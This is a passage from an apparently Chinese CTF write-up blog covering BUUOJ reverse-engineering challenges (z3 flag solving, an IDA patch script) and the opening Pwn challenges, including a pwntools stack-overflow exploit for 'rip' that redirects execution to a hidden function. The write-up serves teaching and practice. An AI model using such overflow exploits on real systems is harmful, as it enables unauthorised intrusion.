src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105231955791.png" alt="image-20211105231955791"></p><h3 id="b01lers2020-chugga-chugga"><a href="#b01lers2020-chugga-chugga" class="headerlink" title="[b01lers2020]chugga_chugga"></a>[b01lers2020]chugga_chugga</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  chugga_chugga file chugga</span><br><span class="line">chugga: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure><p>核心代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">input = (_BYTE *)*v25;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">2</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">2</span>] != <span class="string">&#x27;t&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">9</span>] != <span class="string">&#x27;c&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">0x10</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">16</span>] != <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">0x15</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">21</span>] != <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">0x16</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">22</span>] != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v4 = input[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">if</span> ( v4 != <span class="number">115</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( (input[<span class="number">3</span>] ^ <span class="string">&#x27;t&#x27;</span>) != <span class="number">18</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v5 = input[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> ( v5 != <span class="string">&#x27;c&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v6 = input[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">if</span> ( v6 != <span class="number">100</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v7 = input[<span class="number">13</span>];</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">12</span>] != v7 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">19</span>] != <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v8 = input[<span class="number">14</span>];</span><br><span class="line">v9 = input[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span> ( v9 + v8 != <span class="string">&#x27;h&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v10 = input[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">if</span> ( v10 != <span class="number">123</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">v11 = input[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">15</span>] != v11 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( v11 + <span class="number">4</span> == v5</span><br><span class="line">  &amp;&amp; (v12 = input[<span class="number">17</span>], v13 = input[<span class="number">11</span>], <span class="string">&#x27;&#125;&#x27;</span> - v12 + <span class="number">40</span> == v13)</span><br><span class="line">  &amp;&amp; (v14 = input[<span class="number">18</span>], v15 = v12 + v13 - v4 - v14, v16 = v14 - v12, v15 == v16)</span><br><span class="line">  &amp;&amp; (v17 = v9 - v12, *input == v16 * (v17 &gt;&gt; <span class="number">1</span>) + <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">  &amp;&amp; (v18 = input[<span class="number">10</span>], v7 + <span class="number">1</span> == v18)</span><br><span class="line">  &amp;&amp; v17 + <span class="number">2</span> * v17 + <span class="number">4</span> * (v10 - v6) == v18</span><br><span class="line">  &amp;&amp; input[<span class="number">20</span>] - v5 == <span class="number">2</span> * v16</span><br><span class="line">  &amp;&amp; (v4 ^ <span class="string">&#x27;n&#x27;</span>) == <span class="number">29</span></span><br><span class="line">  &amp;&amp; v17 == <span class="number">4</span> * v16</span><br><span class="line">  &amp;&amp; input[<span class="number">6</span>] == v8 )</span><br><span class="line">&#123;</span><br><span class="line">  main_win();</span><br><span class="line">  v3 = v24;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则可以直接用z3暴力解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>)]</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">2</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">9</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">16</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">21</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">22</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">5</span>] == <span class="number">115</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>] ^ <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>) == <span class="number">18</span>)</span><br><span class="line">s.add(x[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">7</span>] == <span class="number">100</span>)</span><br><span class="line">s.add(x[<span class="number">12</span>] == x[<span class="number">13</span>])</span><br><span class="line">s.add(x[<span class="number">19</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">14</span>] + x[<span class="number">6</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;h&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">4</span>] == <span class="number">123</span>)</span><br><span class="line">s.add(x[<span class="number">15</span>] == x[<span class="number">8</span>])</span><br><span class="line">s.add(x[<span class="number">8</span>] + <span class="number">4</span> == x[<span class="number">1</span>])</span><br><span class="line">v12 = x[<span class="number">17</span>]</span><br><span class="line">v13 = x[<span class="number">11</span>]</span><br><span class="line">s.add(x[<span class="number">11</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>)- x[<span class="number">17</span>] + <span class="number">40</span>)</span><br><span class="line">v14 = x[<span class="number">18</span>]</span><br><span class="line">v4 = x[<span class="number">5</span>]</span><br><span class="line">v15 = v12 + v13 - v4 - v14</span><br><span class="line">v16 = v14 - v12</span><br><span class="line">s.add(v15 == v16)</span><br><span class="line">v9 = x[<span class="number">6</span>]</span><br><span class="line">v17 = v9 - v12</span><br><span class="line">s.add(x[<span class="number">0</span>] == v16 * (v17 &gt;&gt; <span class="number">1</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>))</span><br><span class="line">v18 = x[<span class="number">10</span>]</span><br><span class="line">v7 = x[<span class="number">13</span>]</span><br><span class="line">s.add(v7 + <span class="number">1</span> == v18)</span><br><span class="line">v10 = x[<span class="number">4</span>]</span><br><span class="line">v6 = x[<span class="number">7</span>]</span><br><span class="line">s.add(v17 + <span class="number">2</span> * v17 + <span class="number">4</span> * (v10 - v6) == v18)</span><br><span class="line">v5 = x[<span class="number">1</span>]</span><br><span class="line">s.add(x[<span class="number">20</span>] - v5 == <span class="number">2</span> * v16)</span><br><span class="line">s.add((v4 ^ <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>)) == <span class="number">29</span>)</span><br><span class="line">s.add(v17 == <span class="number">4</span> * v16)</span><br><span class="line">v8 = x[<span class="number">14</span>]</span><br><span class="line">s.add(x[<span class="number">6</span>] == v8)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line">m = s.model()</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    flag.append(m[i].as_long())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="RCTF2019-DontEatMe"><a href="#RCTF2019-DontEatMe" class="headerlink" title="[RCTF2019]DontEatMe"></a>[RCTF2019]DontEatMe</h3><p><a href="https://lantern.cool/wp-games-2019rctf/">2019 RCTF | Lantern’s 小站</a></p><h3 id="XMAN2018排位赛-Dragon-Quest"><a href="#XMAN2018排位赛-Dragon-Quest" class="headerlink" title="[XMAN2018排位赛]Dragon Quest"></a>[XMAN2018排位赛]Dragon Quest</h3><p>存在大量不透明谓词，用脚本直接去掉(pizza yyds)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_xref</span><br><span class="line"><span class="keyword">import</span> ida_idaapi</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> get_bytes, patch_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_patch</span>(<span class="params">ea</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(get_bytes(ea, <span class="number">1</span>) == <span class="string">b&quot;\x8B&quot;</span>): <span class="comment"># mov eax-edi, dword</span></span><br><span class="line">        reg = (<span class="built_in">ord</span>(get_bytes(ea + <span class="number">1</span>, <span class="number">1</span>)) &amp; <span class="number">0b00111000</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">        patch_bytes(ea, (<span class="number">0xB8</span> + reg).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + <span class="string">b&#x27;\x00\x00\x00\x00\x90\x90&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span>(get_bytes(ea, <span class="number">2</span>) == <span class="string">b&quot;\x44\x8B&quot;</span>): <span class="comment"># mov r8d-r15d, dword</span></span><br><span class="line">        reg = (<span class="built_in">ord</span>(get_bytes(ea + <span class="number">2</span>, <span class="number">1</span>)) &amp; <span class="number">0b00111000</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">        patch_bytes(ea + <span class="number">1</span>, (<span class="number">0xB8</span> + reg).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + <span class="string">b&#x27;\x00\x00\x00\x00\x90\x90&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x0000000000610318</span>, <span class="number">0x00000000006105AC</span>, <span class="number">4</span>):</span><br><span class="line">    ref = ida_xref.get_first_dref_to(addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(addr).center(<span class="number">20</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">    <span class="keyword">while</span>(ref != ida_idaapi.BADADDR):</span><br><span class="line">        do_patch(ref)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;patch at &#x27;</span> + <span class="built_in">hex</span>(ref))</span><br><span class="line">        ref = ida_xref.get_next_dref_to(addr, ref)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>之后逻辑便比较清晰了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">start_quest</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD v2[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+48h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+4Fh] [rbp-41h]</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> *input; <span class="comment">// [rsp+50h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> *v6; <span class="comment">// [rsp+58h] [rbp-38h]</span></span><br><span class="line">  _QWORD *v7; <span class="comment">// [rsp+60h] [rbp-30h]</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> *i; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = a1; ; v2[<span class="number">1</span>] = <span class="built_in">std</span>::<span class="built_in">string</span>::length(i) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &amp;v2[<span class="number">-2</span>];</span><br><span class="line">    v7 = &amp;v2[<span class="number">-2</span>];</span><br><span class="line">    v6 = (<span class="keyword">int</span> *)&amp;v2[<span class="number">-2</span>];</span><br><span class="line">    input = (<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v2[<span class="number">-2</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_100);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_214);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_266);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_369);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_417);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_527);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_622);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_733);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_847);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_942);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1054);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1106);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1222);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1336);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1441);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1540);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1589);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1686);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1796);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1891);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1996);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2112);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2165);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2260);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2336);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2412);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2498);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2575);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="built_in">string</span>::length(i) - <span class="number">1LL</span> != legend &gt;&gt; <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_100);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_214);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_266);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_369);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_417);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_527);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_622);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_733);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_847);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_942);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1054);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1106);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1222);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1336);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1441);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1540);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1589);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1686);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1796);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1891);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_1996);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2112);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2165);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2260);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2336);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2412);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2498);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(&amp;hero, &amp;secret_2575);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *v6 = legend &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(input, i);</span><br><span class="line">    v3 = sanitize_input(input);</span><br><span class="line">    *v6 = v3;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(input);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是进行一些初始化和校验flag长度是否为<code>(legend &gt;&gt; 2) + 1</code>, 其中<code>legend == 0x73</code>，接着进入<code>sanitize_input</code>函数</p><p><code>sanitize_input</code>反编译看起来比较复杂，但实际操作就是依次从输入中取出存入另一个<code>vector</code>中，当<code>vector</code>中数大于等于两个时开始送入<code>transform_input</code>中处理后，与hero中的数进行对比</p><p><code>transform_input</code>函数将该<code>vector</code>中的数进行求和</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">100</span>, <span class="number">214</span>, <span class="number">266</span>, <span class="number">369</span>, <span class="number">417</span>, <span class="number">527</span>, <span class="number">622</span>, <span class="number">733</span>, <span class="number">847</span>, <span class="number">942</span>, <span class="number">1054</span>, <span class="number">1106</span>, <span class="number">1222</span>, <span class="number">1336</span>,</span><br><span class="line">        <span class="number">1441</span>, <span class="number">1540</span>, <span class="number">1589</span>, <span class="number">1686</span>, <span class="number">1796</span>, <span class="number">1891</span>, <span class="number">1996</span>, <span class="number">2112</span>, <span class="number">2165</span>, <span class="number">2260</span>, <span class="number">2336</span>, <span class="number">2412</span>, <span class="number">2498</span>, <span class="number">2575</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    data[i] -= data[i-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Pwn环境"><a href="#Pwn环境" class="headerlink" title="Pwn环境"></a>Pwn环境</h3><p>BUUOJ上的Pwn环境libc版本都可以从下面的网址下载</p><p><a href="https://buuoj.cn/resources">https://buuoj.cn/resources</a></p><h3 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h3><p>直接<code>nc</code>上去<code>cat flag</code></p><h3 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  rip checksec pwn1</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>基本没开保护</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv); <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在<code>fun</code>函数，直接溢出到<code>fun</code>即可</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211019211223467.png" alt="image-20211019211223467"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;please input\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;1&quot;</span> * <span class="number">15</span> + <span class="string">b&quot;2&quot;</span> * <span class="number">8</span> + p64(<span class="number">0x000000000040118A</span>) </span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;ok,bye!!!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>保护基本没开，主函数存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span 